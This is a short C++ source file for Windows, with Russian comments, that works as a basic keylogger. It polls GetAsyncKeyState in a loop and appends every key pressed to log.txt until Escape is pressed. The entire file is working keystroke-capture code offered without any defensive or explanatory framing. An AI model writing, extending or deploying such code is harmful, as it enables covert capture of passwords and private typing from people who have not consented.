#include <windows.h>
#include <fstream>
int main() {
	std::ofstream file;
	file.open("log.txt", std::fstream::app);
	int flag = 1;
	while (flag) {
		Sleep(10); // Пауза, чтобы снизить нагрузку на процессор
		for (int key = 8; key <= 190; key++) {
			if (GetAsyncKeyState(key) == -32767) { // Если клавиша была нажата
				HWND foreground = GetForegroundWindow();
				if (foreground) {
					file << char(key); // Запись нажатой клавиши в файл
					file.flush();
				}
			}
			auto i = GetAsyncKeyState(VK_ESCAPE);
				if (i == -32767)
				{
					flag = 0;
					break;
				}
		}
	}
	file.close();
	return 0;
}